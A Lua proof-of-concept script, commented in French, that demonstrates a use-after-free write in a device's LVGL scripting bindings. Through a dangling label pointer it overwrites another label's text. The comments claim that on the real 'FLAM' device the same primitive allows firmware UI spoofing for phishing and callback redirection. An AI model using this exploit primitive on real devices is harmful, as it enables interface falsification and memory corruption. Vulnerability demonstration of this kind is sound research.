-- ============================================================================
--  POC : Ecriture via dangling pointer — corruption d'objet
--
--  Demontre qu'on peut ECRIRE dans la memoire d'un objet qu'on ne
--  possede pas, via Use-After-Free.
--
--  Scenario :
--    1. Creer un spy label, le supprimer
--    2. Un autre label "victime" reutilise le meme bloc
--    3. Ecrire via le spy → le texte de la victime change
--    4. La victime n'a jamais ete touchee directement
--
--  Sur la vraie FLAM : permet de corrompre des labels firmware,
--  modifier des flags d'objets, ou rediriger des callbacks.
-- ============================================================================

local RED   = lv.color.hex(0xFF0000)
local GREEN = lv.color.hex(0x00FF41)
local WHITE = lv.color.hex(0xFFFFFF)
local AMBER = lv.color.hex(0xFFBF00)
local GREY  = lv.color.hex(0x888888)
local DARK  = lv.color.hex(0x0a0a0a)

local function log(msg) print("[WRITE] " .. msg) end

lv.obj.set_style_bg_color(window, lv.color.hex(0x000000), 0)
lv.obj.set_style_bg_opa(window, lv.OPA_COVER, 0)

-- ============================================================================
log("")
log("=== ETAPE 1 : Creer le spy, le supprimer ===")

local spy = lv.label.new(window)
lv.label.set_text(spy, ".")
lv.obj.add_flag(spy, lv.OBJ_FLAG_HIDDEN)
lv.obj.del(spy)

log("  spy cree avec \".\", puis supprime.")
log("  spy est maintenant un dangling pointer.")
log("")

-- ============================================================================
log("=== ETAPE 2 : Creer la victime (reutilise le bloc) ===")

local victim = lv.label.new(window)
lv.label.set_text(victim, "Texte original du firmware")
lv.obj.add_flag(victim, lv.OBJ_FLAG_HIDDEN)

log("  victime creee avec \"Texte original du firmware\"")
log("")

-- ============================================================================
log("=== ETAPE 3 : Verifier que spy pointe vers la victime ===")

local ok_r, read_before = pcall(lv.label.get_text, spy)
if ok_r then
    log("  spy lit : \"" .. read_before .. "\"")
    if read_before == "Texte original du firmware" then
        log("  → Confirme : spy et victime partagent le meme bloc !")
    end
end
log("")

-- ============================================================================
log("=== ETAPE 4 : ECRITURE via le dangling pointer ===")

local ok_w = pcall(lv.label.set_text, spy, "CORROMPU PAR UAF")
if ok_w then
    log("  lv.label.set_text(spy, \"CORROMPU PAR UAF\") → OK")
else
    log("  ECHEC de l'ecriture")
end
log("")

-- ============================================================================
log("=== ETAPE 5 : Verifier la victime (jamais touchee directement) ===")

local victim_text = lv.label.get_text(victim)
log("  victime lit : \"" .. victim_text .. "\"")

if victim_text == "CORROMPU PAR UAF" then
    log("")
    log("  *** CORRUPTION CONFIRMEE ***")
    log("  Le texte de la victime a ete modifie via le spy.")
    log("  Le code n'a JAMAIS appele set_text sur victim.")
    log("")
    log("  Sur la vraie FLAM, cela permet de :")
    log("    - Modifier les labels firmware (menus, notifications)")
    log("    - Falsifier l'interface utilisateur (phishing)")
    log("    - Corrompre les flags/state d'objets systeme")
    log("    - Potentiellement rediriger des callbacks")
end

-- ============================================================================
-- Affichage

local title = lv.label.new(window)
lv.label.set_text(title, "Write via UAF")
lv.obj.set_style_text_color(title, RED, 0)
lv.obj.align(title, lv.ALIGN_TOP_MID, 0, 8)

local box = lv.obj.new(window)
lv.obj.set_size(box, 305, 155)
lv.obj.align(box, lv.ALIGN_CENTER, 0, 15)
lv.obj.set_style_bg_color(box, lv.color.hex(0x111111), 0)
lv.obj.set_style_bg_opa(box, lv.OPA_COVER, 0)
lv.obj.set_style_radius(box, 6, 0)
lv.obj.remove_flag(box, lv.OBJ_FLAG_SCROLLABLE)

local l1 = lv.label.new(box)
lv.label.set_text(l1, "1. spy = label.new() → \".\"")
lv.obj.set_style_text_color(l1, GREEN, 0)
lv.obj.align(l1, lv.ALIGN_TOP_LEFT, 6, 4)

local l2 = lv.label.new(box)
lv.label.set_text(l2, "2. obj.del(spy)")
lv.obj.set_style_text_color(l2, GREEN, 0)
lv.obj.align(l2, lv.ALIGN_TOP_LEFT, 6, 20)

local l3 = lv.label.new(box)
lv.label.set_text(l3, "3. victim = label.new()")
lv.obj.set_style_text_color(l3, AMBER, 0)
lv.obj.align(l3, lv.ALIGN_TOP_LEFT, 6, 36)

local l4 = lv.label.new(box)
lv.label.set_text(l4, "   → \"Texte original du firmware\"")
lv.obj.set_style_text_color(l4, GREY, 0)
lv.obj.align(l4, lv.ALIGN_TOP_LEFT, 6, 52)

local l5 = lv.label.new(box)
lv.label.set_text(l5, "4. set_text(SPY, \"CORROMPU PAR UAF\")")
lv.obj.set_style_text_color(l5, RED, 0)
lv.obj.align(l5, lv.ALIGN_TOP_LEFT, 6, 72)

local l6 = lv.label.new(box)
lv.label.set_text(l6, "5. get_text(VICTIM) =")
lv.obj.set_style_text_color(l6, GREY, 0)
lv.obj.align(l6, lv.ALIGN_TOP_LEFT, 6, 92)

local l7 = lv.label.new(box)
lv.label.set_text(l7, "   \"" .. victim_text .. "\"")
if victim_text == "CORROMPU PAR UAF" then
    lv.obj.set_style_text_color(l7, RED, 0)
else
    lv.obj.set_style_text_color(l7, AMBER, 0)
end
lv.obj.align(l7, lv.ALIGN_TOP_LEFT, 6, 108)

local verdict = lv.label.new(box)
if victim_text == "CORROMPU PAR UAF" then
    lv.label.set_text(verdict, "Victime corrompue sans y toucher !")
    lv.obj.set_style_text_color(verdict, RED, 0)
else
    lv.label.set_text(verdict, "Pas de corruption cette fois")
    lv.obj.set_style_text_color(verdict, AMBER, 0)
end
lv.obj.align(verdict, lv.ALIGN_TOP_LEFT, 6, 132)

log("  Fermez la fenetre pour quitter.")
